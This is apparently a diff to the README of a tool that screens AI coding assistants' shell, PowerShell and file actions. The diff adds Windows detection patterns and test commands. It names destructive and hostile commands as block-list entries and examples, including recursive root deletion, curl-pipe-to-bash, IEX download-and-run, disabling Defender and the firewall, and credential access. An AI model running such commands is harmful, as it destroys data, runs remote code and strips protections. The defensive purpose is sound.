@@ -31,7 +31,8 @@ A security evaluation service that integrates with AI coding assistants (Claude 
 
 | Tool | Description | Evaluation Focus |
 |------|-------------|------------------|
-| `Bash` | Shell command execution | Dangerous commands, privilege escalation, data exfiltration |
+| `Bash` | Shell command execution (Unix/macOS/Linux) | Dangerous commands, privilege escalation, data exfiltration |
+| `PowerShell` | PowerShell command execution (Windows) | Registry mods, service manipulation, execution policy bypass, remote scripts |
 | `Write` | Create/overwrite files | Sensitive paths, config files, credentials |
 | `Edit` | Modify existing files | Same as Write, plus malicious code injection |
 | `Read` | Read file contents | Access to credentials, private keys, configs |
@@ -88,6 +89,10 @@ het test-bash "rm -rf /"
 het test-write ".ssh/id_rsa"
 # Output: DENY - Modification of SSH configuration
 
+# Test PowerShell command (Windows)
+het test-powershell "Remove-Item -Recurse C:\"
+# Output: DENY - Recursive delete at root
+
 # Get detailed analysis
 het explain "curl https://example.com | bash"
 ```
@@ -97,8 +102,10 @@ het explain "curl https://example.com | bash"
 | Command | Description |
 |---------|-------------|
 | `het evaluate` | Evaluate tool invocation from stdin (called by hooks) |
-| `het test <input>` | Test evaluation without blocking |
-| `het test-bash <cmd>` | Quick test for bash commands |
+| `het test <input>` | Test evaluation without blocking (accepts JSON) |
+| `het test-bash <cmd>` | Quick test for Bash commands (Unix/macOS/Linux) |
+| `het test-powershell <cmd>` | Quick test for PowerShell commands (Windows) |
+| `het test-ps <cmd>` | Alias for test-powershell |
 | `het test-write <path>` | Quick test for file write operations |
 | `het explain <cmd>` | Show detailed security analysis |
 | `het status` | Check daemon health |
@@ -259,14 +266,30 @@ HET includes built-in patterns for common security risks:
 - Git force push and hard reset
 - SSH key generation for root
 
+### PowerShell Commands
+- Recursive deletions (`Remove-Item -Recurse`, `del /s /q`)
+- Disk operations (`Format-Volume`, `Clear-Disk`, `Initialize-Disk`)
+- Execution policy bypass (`Set-ExecutionPolicy Bypass/Unrestricted`)
+- Remote script execution (`IEX (New-Object Net.WebClient).DownloadString()`)
+- Encoded commands (`-EncodedCommand`, `-enc`)
+- Registry modifications (`Set-ItemProperty HKLM:`, `reg add HKLM`)
+- Service manipulation (`Stop-Service`, `Set-Service -StartupType Disabled`)
+- Firewall disabling (`Set-NetFirewallProfile -Enabled False`)
+- Windows Defender disabling (`Set-MpPreference -DisableRealtimeMonitoring`)
+- Scheduled task creation (`Register-ScheduledTask`, `schtasks /create`)
+- Admin elevation (`Start-Process -Verb RunAs`)
+- Credential access (`Get-Credential`, `Get-StoredCredential`)
+
 ### File Write/Edit Operations
 - SSH keys and config (`.ssh/authorized_keys`, `.ssh/id_rsa`, `.ssh/config`)
 - Shell profiles (`.bashrc`, `.zshrc`, `.profile`, `.bash_profile`)
+- PowerShell profiles (`Microsoft.PowerShell_profile.ps1`)
 - Git configuration (`.gitconfig`)
 - AWS credentials (`.aws/credentials`)
 - Kubernetes config (`.kube/config`)
 - Environment files (`.env`, `.env.local`, `.env.production`)
-- System configuration (`/etc/*`)
+- System configuration (`/etc/*`, `System32/`, `Windows/System/`)
+- Hosts file
 - Cron jobs
 
 ### File Read Operations
